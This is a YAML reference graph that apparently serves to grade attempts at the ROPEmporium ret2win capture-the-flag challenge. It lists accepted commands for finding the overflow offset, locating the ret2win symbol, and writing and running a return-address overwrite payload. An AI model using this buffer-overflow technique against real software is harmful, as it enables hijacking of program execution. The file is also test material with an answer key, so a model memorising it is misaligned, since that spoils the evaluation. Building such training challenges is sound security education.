version: '0.5'
graph:
  type: reference
challenge:
  id: ropemporium_ret2win
  name: ROPEmporium ret2win
  description: Overwrite the saved return address and redirect execution to ret2win()
    so that the binary prints the flag.
attacker_context:
  user: ctf-player
  access:
    method: local_shell
    credentials: null
  target:
    host: local
    path: <path-to-challenge-binary>
    architecture: <challenge-architecture>
    os: linux
goal:
  node: node3
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- man ropper
- python3
- python
- bash
- sh
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Overflow offset identified
- id: node1
  type: state
  label: ret2win symbol identified
- id: node2
  type: state
  label: Payload crafted
- id: node3
  type: state
  label: Flag printed
edges:
- action: determine_overflow_offset
  accepted_commands:
  - ragg2 -P 200 -r > pattern.txt && ./ret2win < pattern.txt
  - cyclic 200 > pattern.txt && ./ret2win < pattern.txt
  - python3 -c "from pwn import *; print(cyclic(200).decode())" | ./ret2win
  - gdb -q ./ret2win
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge0
  from: start
  to: node0
- action: locate_ret2win_symbol
  accepted_commands:
  - nm ret2win | grep ret2win
  - objdump -d ret2win | grep ret2win
  - rabin2 -qs ret2win | grep ret2win
  transition_match:
    exit_code: 0
    stdout_regex: .*ret2win.*
    stderr_regex: ^$
  id: edge1
  from: node0
  to: node1
- action: craft_payload_with_ret2win_address
  accepted_commands:
  - python3 -c "from struct import pack; import sys; offset=40; ret2win=0xRET2WIN;
    sys.stdout.buffer.write(b'A'*offset + pack('<Q', ret2win))" > payload.bin
  - 'python3 -c "from pwn import *; offset=40; ret2win=0xRET2WIN; import sys; sys.stdout.buffer.write(flat({offset:
    p64(ret2win)}))" > payload.bin'
  - python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A'*40
    + pack('<Q', 0xRET2WIN))" > payload.bin
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge2
  from: node1
  to: node2
- action: execute_payload_and_redirect_to_ret2win
  accepted_commands:
  - ./ret2win < payload.bin
  - cat payload.bin - | ./ret2win
  transition_match:
    exit_code: 0
    stdout_regex: .*flag.*
    stderr_regex: .*
  id: edge3
  from: node2
  to: node3
